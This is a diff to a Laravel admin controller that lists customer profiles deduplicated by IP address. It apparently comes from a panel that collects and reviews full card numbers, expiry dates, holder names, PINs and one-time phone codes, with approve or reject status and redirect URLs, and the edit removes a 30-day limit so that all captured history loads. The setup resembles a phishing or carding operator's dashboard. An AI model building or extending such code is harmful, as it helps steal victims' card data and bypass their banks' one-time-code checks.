@@ -157,9 +157,11 @@ class AdminCustomerController extends Controller
         // Dedupe by IP before pagination: keep latest row per ip_address.
         // Legacy duplicated rows can still exist; deduping at SQL level makes
         // pagination + totals stable and removes per-page unique() side effects.
+        // Customers with no IP address should not be collapsed into a single row,
+        // so group null IPs uniquely by row id.
         $dedupedIdsQuery = (clone $baseFiltered)
             ->selectRaw('MAX(id) as id')
-            ->groupBy('ip_address');
+            ->groupBy(DB::raw('IFNULL(ip_address, CONCAT("null-", id))'));
 
         $query = CustomerProfile::query()
             ->whereIn('id', $dedupedIdsQuery)
@@ -174,12 +176,11 @@ class AdminCustomerController extends Controller
                 // records when total rows across the page exceeded the limit,
                 // making latest_pin / latest_phone_otp appear null in the
                 // dashboard refresh payload (the disappearing-blocks bug).
-                // We scope by recency instead, which is bounded per customer.
+                // Load full related history for this page so new-data detection
+                // and admin list formatting remain accurate.
                 'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
-                    ->where('created_at', '>=', now()->subDays(30))
                     ->latest(),
                 'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
-                    ->where('created_at', '>=', now()->subDays(30))
                     ->latest(),
             ])
             // Ordering rules (see issue: admin viewing demoted customers from #1):
